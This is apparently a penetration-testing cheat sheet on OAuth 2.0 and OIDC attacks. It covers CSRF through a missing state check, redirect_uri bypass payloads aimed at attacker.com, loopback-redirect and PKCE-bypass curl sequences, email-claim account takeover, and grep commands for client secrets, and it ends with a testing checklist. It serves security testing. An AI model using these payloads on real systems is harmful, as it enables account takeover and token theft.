# OAuth 2.0 / OIDC Attacks

## Flow Quick Reference

```
Authorization Code Flow:
1. App -> /authorize?client_id=X&redirect_uri=Y&state=Z&response_type=code
2. User logs in at IdP -> IdP redirects to Y?code=AUTH_CODE&state=Z
3. App -> /token (code=AUTH_CODE, client_secret=SECRET) -> access_token
4. App uses access_token to call the resource server

Implicit Flow (deprecated but still exists):
1. App -> /authorize?...&response_type=token
2. IdP redirects to redirect_uri#access_token=TOKEN (URL fragment)
```

## 1. State Parameter Missing / Not Validated

`state` is OAuth's CSRF token. If missing or not validated:
```html
<!-- Attacker page - victim visits it while logged in to the IdP -->
<img src="https://target.com/oauth/callback?code=ATTACKER_AUTH_CODE">
<!-- Victim's account on target.com gets linked to the attacker's IdP account -->
```
Test: capture the authorization URL, remove `&state=`, or replay with a different state value
than what was issued - does it still complete?

## 2. redirect_uri Manipulation

```
# Legitimate: redirect_uri=https://target.com/callback
# Attack:     redirect_uri=https://attacker.com/steal   -> code delivered to attacker's server

# Bypasses when the server does a naive prefix/domain check:
redirect_uri=https://target.com@attacker.com/callback
redirect_uri=https://target.com.attacker.com/callback
redirect_uri=https://attacker.com?x=https://target.com/callback
redirect_uri=https://target.com/callback/../../../evil
redirect_uri=https://target.com/callback%2F%2E%2E%2Fevil

# Wildcard subdomain accepted
redirect_uri=https://evil.target.com/callback   (if *.target.com is allowed)
```
If `target.com/callback` itself has an open redirect, the code can land at the legitimate
callback and then get forwarded on:
```
redirect_uri=https://target.com/callback?next=https://attacker.com
```

### 2.1 Loopback/Localhost redirect_uri - Read the Code Off the Location Header Directly

If an OAuth authorization server lets any authenticated user self-register a new client app (a
"connected apps"/developer-console feature many SaaS products expose), check whether it
accepts a `redirect_uri` pointing at `http://localhost:<any-port>/...` or `127.0.0.1`. Many
implementations special-case loopback addresses as "safe" (assuming a native/CLI OAuth client)
without considering that an attacker never needs the browser to actually *reach* that
destination:
```bash
# Register a client app with a redirect_uri the attacker doesn't need to control:
curl -s -X POST https://target/api/apps -b "$SESSION" \
  --data-urlencode "name=DemoApp" \
  --data-urlencode "redirect_uris=http://localhost:3000/oauth/callback" \
  --data-urlencode "scopes=files:write"

# Approve the grant - capture the Location header directly, no listener needed:
curl -sv -X POST https://target/api/oauth/authorize -b "$SESSION" \
  --data-urlencode "client_id=$CLIENT_ID" \
  --data-urlencode "redirect_uri=http://localhost:3000/oauth/callback" \
  --data-urlencode "scope=files:write" --data-urlencode "decision=approve" 2>&1 | grep -i "^< location:"
# Location: http://localhost:3000/oauth/callback?code=<AUTH_CODE>

curl -s -X POST https://target/api/oauth/token \
  --data-urlencode "grant_type=authorization_code" --data-urlencode "code=<AUTH_CODE>" \
  --data-urlencode "redirect_uri=http://localhost:3000/oauth/callback" \
  --data-urlencode "client_id=$CLIENT_ID" --data-urlencode "client_secret=$CLIENT_SECRET"
```
The exploitable real-engagement case: chain this with any CSRF-triggerable approval flow
(missing/absent `state` validation, or an authorize endpoint reachable via a same-site
GET/POST from an attacker page) against a victim's privileged session - the attacker reads the
code from the response their own script receives, without ever needing a publicly reachable
callback listener. Test whenever an app lets a user register their own OAuth client with a
self-chosen `redirect_uri` - loopback addresses should be rejected or restricted to genuinely
native/CLI-flow clients, not treated as universally safe.

## 3. Authorization Code Interception via Referer

If the callback page loads third-party resources (images, scripts) before consuming the code,
the code leaks in the `Referer` header of that resource load:
```
https://target.com/callback?code=AUTH_CODE&state=XYZ
    -> page loads <img src="https://analytics.com/pixel.png">
    -> Referer: https://target.com/callback?code=AUTH_CODE&state=XYZ leaks to the analytics service
```

### 3.5 XSS-Driven Code Theft by Stopping the Redirect

If XSS exists on (or before) the OAuth callback page but the app immediately consumes and
redirects away from the `?code=` URL - too fast for a normal `location.search` read - stall
the navigation on a same-origin error page to buy time:
- **Inflate the `state` parameter** to an oversized value that triggers a server error instead
  of a successful redirect, keeping the page on the same origin where injected XSS can still
  read `location.search`.
- **`navigation.entries()`** (Chrome): even after the app redirects to a cross-origin error
  page, Chrome's Navigation API retains full URL history including the pre-redirect
  code-bearing URL, readable from same-origin XSS that ran before the redirect fired.
- **Empty `Location:` header quirk**: a 3xx response with a blank `Location:` header makes
  Chrome render the response body directly instead of redirecting.

## 4. PKCE Bypass

PKCE prevents code interception for public clients. Weak implementations don't actually
validate `code_verifier` against `code_challenge`:
```bash
curl -X POST https://target.com/token -d "grant_type=authorization_code&code=AUTH_CODE&client_id=X"   # omit code_verifier
curl -X POST https://target.com/token -d "grant_type=authorization_code&code=CODE&code_verifier="       # empty
curl -X POST https://target.com/token -d "grant_type=authorization_code&code=CODE&code_verifier=aaaa"   # any value
```

## 5. Account Takeover via Email Claim

If the app trusts the IdP's `email` claim without verifying uniqueness:
```
1. Victim has an existing account: victim@gmail.com (registered via password)
2. Attacker registers a Google account using the same email: victim@gmail.com
3. Attacker OAuth-links their Google account -> gets an ID token with email=victim@gmail.com
4. App looks up the user by email, finds the victim's account, logs the attacker in as victim
```
Test: register an IdP account with the same email as an existing target.com account, attempt
OAuth login.

## 6. Token Leakage via Fragment in Implicit Flow

Implicit flow puts the token in the URL fragment (`#access_token=...`) - readable by any JS on
the page, and present in browser history, proxy logs, and (if forwarded) Referer headers.

## 7. IdP Mixup Attack

If the app supports multiple IdPs and doesn't validate which IdP a code actually came from:
start login with IdP A, intercept the redirect, and substitute a code from IdP B - the app
sends IdP B's code to IdP A's token endpoint, which can cause errors that leak information or
swap contexts.

## 8. Scope Escalation

```
# Original: scope=openid profile email
# Attempt:  scope=openid profile email admin offline_access
```
If the IdP accepts a broader scope than the app normally requests and the app forwards it
through unfiltered, you get extra access.

## 9. nonce Not Validated (OIDC)

`nonce` prevents ID token replay. If not validated: obtain a valid ID token for your own
account, replay it for a different session to bypass authentication.

## 10. Client Secret Leakage

```bash
grep -r "client_secret" /var/www/html/
grep -r "OAUTH_SECRET" .env
```
Also check mobile app decompiles, GitHub repos, and public code search for the target's
`client_secret`.

## 11. Token Storage Attacks

- `localStorage` -> XSS steals the token permanently.
- `sessionStorage` -> XSS in the same tab steals it.
- `HttpOnly` cookie -> XSS can't read it directly, but can still ride on it via requests.

## Checklist

- [ ] `state` parameter present and validated (CSRF)
- [ ] `redirect_uri`: open redirect, wildcard subdomain, path traversal bypass tried
- [ ] `redirect_uri`: loopback/localhost accepted on self-registered clients?
- [ ] Referer leakage on the callback page (third-party resources loaded before code consumption)
- [ ] PKCE: `code_verifier` actually validated?
- [ ] Email claim uniqueness - account takeover via matching email tested
- [ ] Implicit flow token exposure in the URL fragment
- [ ] Scope escalation attempted in the authorization request
- [ ] `nonce` validated in the OIDC flow
- [ ] Client secret searched for in JS/source/repos
- [ ] Token storage location checked (localStorage = XSS-stealable)
